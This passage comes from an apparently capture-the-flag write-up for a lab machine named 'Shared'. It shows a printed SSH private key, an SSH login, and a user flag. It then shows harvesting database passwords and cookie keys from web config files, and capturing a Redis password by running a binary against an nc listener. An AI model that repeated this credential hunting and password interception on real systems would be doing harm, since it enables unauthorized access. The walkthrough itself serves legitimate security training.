font-style: inherit;">+EIdpfa1xrSuhtOfg11o/jgHv0N+IAjIBRuId5j8O7Uc9qZU0QUH4C3K71Q6ELXjzhHP17</span></span>
<span id="cb11-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lX3/pEB+z1PSdXNBf4Qu4G5JZtmwPGEzZZwkNmdmfh0s3hFw+a17QgOvReBLtRQqHS0TgC</span></span>
<span id="cb11-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">zT4KwDOC4DGw98WluQamVq5tuLj/5QAAAAMBAAEAAAGBAK05auPU9BzHO6Vd/tuzUci/ep</span></span>
<span id="cb11-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wiOrhOMHSxA4y72w6NeIlg7Uev8gva5Bc41VAMZXEzyXFn8kXGvOqQoLYkYX1vKi13fG0r</span></span>
<span id="cb11-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SYpNLH5/SpQUaa0R52uDoIN15+bsI1NzOsdlvSTvCIUIE1GKYrK2t41lMsnkfQsvf9zPtR</span></span>
<span id="cb11-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1TA+uLDcgGbHNEBtR7aQ41E9rDA62NTjvfifResJZre/NFFIRyD9+C0az9nEBLRAhtTfMC</span></span>
<span id="cb11-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">E7cRkY0zDSmc6vpn7CTMXOQvdLao1WP2k/dSpwiIOWpSLIbpPHEKBEFDbKMeJ2G9uvxXtJ</span></span>
<span id="cb11-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">f3uQ14rvy+tRTog/B3/PgziSb6wvHri6ijt6N9PQnKURVlZbkx3yr397oVMCiTe2FA+I/Y</span></span>
<span id="cb11-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pPtQxpmHjyClPWUsN45PwWF+D0ofLJishFH7ylAsOeDHsUVmhgOeRyywkDWFWMdz+Ke+XQ</span></span>
<span id="cb11-37"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">YWfa9RiI5aTaWdOrytt2l3Djd1V1/c62M1ekUoUrIuc5PS8JNlZQl7fyfMSZC9mL+iOQAA</span></span>
<span id="cb11-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">AMEAy6SuHvYofbEAD3MS4VxQ+uo7G4sU3JjAkyscViaAdEeLejvnn9i24sLWv9oE9/UOgm</span></span>
<span id="cb11-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2AwUg3cT7kmKUdAvBHsj20uwv8a1ezFQNN5vxTnQPQLTiZoUIR7FDTOkQ0W3hfvjznKXTM</span></span>
<span id="cb11-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wictz9NZYWpEZQAuSX2QJgBJc1WNOtrgJscNauv7MOtZYclqKJShDd/NHUGPnNasHiPjtN</span></span>
<span id="cb11-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">CRr7thGmZ6G9yEnXKkjZJ1Neh5Gfx31fQBaBd4XyVFsvUSphjNAAAAwQD4Yntc2zAbNSt6</span></span>
<span id="cb11-42"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">GhNb4pHYwMTPwV4DoXDk+wIKmU7qs94cn4o33PAA7ClZ3ddVt9FTkqIrIkKQNXLQIVI7EY</span></span>
<span id="cb11-43"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Jg2H102ohz1lPWC9aLRFCDFz3bgBKluiS3N2SFbkGiQHZoT93qn612b+VOgX1qGjx1lZ/H</span></span>
<span id="cb11-44"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">I152QStTwcFPlJ0Wu6YIBcEq4Rc+iFqqQDq0z0MWhOHYvpcsycXk/hIlUhJNpExIs7TUKU</span></span>
<span id="cb11-45"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SJyDK0JWt2oKPVhGA62iGGx2+cnGIoROcAAADBAMMvzNfUfamB1hdLrBS/9R+zEoOLUxbE</span></span>
<span id="cb11-46"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SENrA1qkplhN/wPta/wDX0v9hX9i+2ygYSicVp6CtXpd9KPsG0JvERiVNbwWxD3gXcm0BE</span></span>
<span id="cb11-47"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">wMtlVDb4WN1SG5Cpyx9ZhkdU+t0gZ225YYNiyWob3IaZYWVkNkeijRD+ijEY4rN41hiHlW</span></span>
<span id="cb11-48"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">HPDeHZn0yt8fTeFAm+Ny4+8+dLXMlZM5quPoa0zBbxzMZWpSI9E6j6rPWs2sJmBBEKVLQs</span></span>
<span id="cb11-49"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">tfJMvuTgb3NhHvUwAAAAtyb290QHNoYXJlZAECAwQFBg</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>=</span>
<span id="cb11-50"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----END</span> OPENSSH PRIVATE KEY-----</span></code></pre></div>
<p>Write to file, login and grab <code>user.txt</code>.</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared vim dan-id_rsa</span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared chmod 400 dan-id_rsa </span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared ssh dan_smith@shared.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> dan-id_rsa </span>
<span id="cb12-4"></span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith@shared:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> user.txt</span>
<span id="cb12-6"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1001<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1002<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1002<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1001</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">developer</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,1003</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sysadmin</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb12-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ac1d7c930a51968f97efe55963ecfe62</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>With manual enumeration we first see that <code>dan_smith</code> is part of <code>sysadmin</code> group, lets look for files owned by that group.</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith@shared:/$</span> find / <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-group</span> sysadmin <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /dev/null</span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/local/bin/redis_connector_dev</span></span></code></pre></div>
<p>If we remember from earlier when we ran <code>pspy64</code> we found another line containing <strong>redis</strong>:</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/08/25</span> 06:58:06 CMD: UID=0    PID=8502   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">pidof</span> redis-server </span></code></pre></div>
<p>We can access the service through <code>redis-cli</code>, however everything we throw at it returns <code>(error) NOAUTH Authentication required.</code>. Lets start hunting for credentials. Most likely we can find SQL creds somewhere in <code>/var/www/</code>.</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith@shared:/var/www/checkout.shared.htb/config$</span> cat db.php </span>
<span id="cb15-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span></span>
<span id="cb15-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DBHOST'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'localhost'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DBUSER'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'checkout'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb15-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DBPWD'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'a54$K_M4?DdT^HUk'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb15-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'DBNAME'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'checkout'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb15-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb15-8"></span>
<span id="cb15-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith@shared:/var/www/shared.htb/ps/app/config$</span> cat parameters.php </span>
<span id="cb15-10"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span> return array <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span></span>
<span id="cb15-11">  <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'parameters'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> </span>
<span id="cb15-12">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">array</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span></span>
<span id="cb15-13">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_host'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'127.0.0.1'</span>,</span>
<span id="cb15-14">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_port'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span>,</span>
<span id="cb15-15">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_name'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'pshop'</span>,</span>
<span id="cb15-16">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_user'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'pshop'</span>,</span>
<span id="cb15-17">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_password'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'T*k#cbND_C*WrQ9h'</span>,</span>
<span id="cb15-18">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_prefix'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ps_'</span>,</span>
<span id="cb15-19">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'database_engine'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'InnoDB'</span>,</span>
<span id="cb15-20">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mailer_transport'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'smtp'</span>,</span>
<span id="cb15-21">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mailer_host'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'127.0.0.1'</span>,</span>
<span id="cb15-22">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mailer_user'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> NULL,</span>
<span id="cb15-23">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mailer_password'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> NULL,</span>
<span id="cb15-24">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'secret'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'JcFbTGrwO5Jm2jLiGt5Da0PThwPCWPpht34Afzg9pehekQ19TxvUeU5Scmr9aH3J'</span>,</span>
<span id="cb15-25">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ps_caching'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'CacheMemcache'</span>,</span>
<span id="cb15-26">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ps_cache_enable'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> false,</span>
<span id="cb15-27">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ps_creation_date'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'2022-03-06'</span>,</span>
<span id="cb15-28">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'locale'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'en-US'</span>,</span>
<span id="cb15-29">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'use_debug_toolbar'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> true,</span>
<span id="cb15-30">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'cookie_key'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'z7FJgNKKsqvFAkvpIRzx9NfTVNWTMdZhnpuP8Xh6aivNDB1vnPaByT9g6uU3OFQO'</span>,</span>
<span id="cb15-31">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'cookie_iv'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'aFoWzPnUUEBiTNd4t4uN66XeS37p3eUp'</span>,</span>
<span id="cb15-32">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'new_cookie_key'</span> =<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'def00000f935fcfbe80eeeb1a4c68e98f394b3685e9b325f43aa713d659b0fb201d9045aa39fd9499c3498b3c1309aa69fcae9c7d7c257162f8336765eb694420d2d8ff2'</span>,</span></code></pre></div>
<p>Testing all found passwords with all found users, including standard username <a href="https://redis.io/commands/auth/">“default”</a>, all fails.. But after a while of testing I noticed something interesting, when running the binary <code>redis_connector_dev</code> they start the service with an interesting line:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dan_smith@shared:/var/www/shared.htb/ps/app/config$</span> /usr/local/bin/redis_connector_dev</span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Logging to redis instance using password...</span>
<span id="cb16-3"></span>
<span id="cb16-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO</span> command result:</span>
<span id="cb16-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Server</span></span>
<span id="cb16-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis_version:6.0.15</span></span>
<span id="cb16-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis_git_sha1:00000000</span></span>
<span id="cb16-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis_git_dirty:0</span></span>
<span id="cb16-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis_build_id:4610f4c3acf7fb25</span></span>
<span id="cb16-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">redis_mode:standalone</span></span>
<span id="cb16-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">os:Linux</span> 5.10.0-16-amd64 x86_64</span>
<span id="cb16-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">arch_bits:64</span></span>
<span id="cb16-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">multiplexing_api:epoll</span></span>
<span id="cb16-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">atomicvar_api:atomic-builtin</span></span>
<span id="cb16-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">gcc_version:10.2.1</span></span>
<span id="cb16-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">process_id:22242</span></span>
<span id="cb16-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">run_id:6eba6ae15533f2538f3bfe3067a305bf07cb1094</span></span>
<span id="cb16-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp_port:6379</span></span>
<span id="cb16-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uptime_in_seconds:38</span></span>
<span id="cb16-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uptime_in_days:0</span></span>
<span id="cb16-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hz:10</span></span>
<span id="cb16-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">configured_hz:10</span></span>
<span id="cb16-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lru_clock:489079</span></span>
<span id="cb16-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">executable:/usr/bin/redis-server</span></span>
<span id="cb16-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">config_file:/etc/redis/redis.conf</span></span>
<span id="cb16-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">io_threads_active:0</span></span>
<span id="cb16-27"> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>nil<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p><em>“Logging to redis instance using <strong>password</strong>”</em> - are they trying to tell me I should extract the password from this binary?</p>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Download the binary <code>redis_connector_dev</code> to your local attacking machine and run it with <code>ltrace</code> to see if we get the password.</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared ltrace ./redis_connector_dev</span>
<span id="cb17-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb17-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO</span> command result:</span>
<span id="cb17-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">__errno_location()</span>                                                                               <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> 0x7f1cf4bf46c0</span>
<span id="cb17-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getaddrinfo</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"localhost"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> nil, 0xc000092960, 0xc0000ac040<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> 0</span>
<span id="cb17-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">freeaddrinfo</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0x1a08540</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>void<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb17-7"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dial</span> tcp <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">::1</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:6379: connect: connection refused</span>
<span id="cb17-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+++</span> exited <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">status</span> 0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+++</span></span></code></pre></div>
<p>It dies before it has a chance to send the credentials.. setup a <code>nc</code> listener on port 6379 and try again.</p>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared ltrace ./redis_connector_dev</span>
<span id="cb18-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb18-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO</span> command result:</span>
<span id="cb18-4"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">__errno_location()</span>                                                                               <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> 0x7f9d634486c0</span>
<span id="cb18-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">getaddrinfo</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"localhost"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> nil, 0xc000068960, 0xc000010050<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> 0</span>
<span id="cb18-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">freeaddrinfo</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0x10523f0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span>                                                                          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>void<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb18-7"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">i/o</span> timeout</span>
<span id="cb18-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+++</span> exited <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">status</span> 0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+++</span></span>
<span id="cb18-9"></span>
<span id="cb18-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  shared nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 6379</span>
<span id="cb18-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 6379 ...</span>
<span id="cb18-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">127.0.0.1</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[127.0.0.1]</span> 46690</span>
<span id="cb18-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*2</span></span>
<span id="cb18-14"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$4</span></span>
<span id="cb18-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">auth</span></span>
<span id="cb18-16"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6</span></span>
<span id="cb18-17"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">F2WHqJUz2WEz</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>Gqq</span></code></pre></div>
<p>With the found password we are now able to authenticate and access the redis server:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="ex" style="color: null;
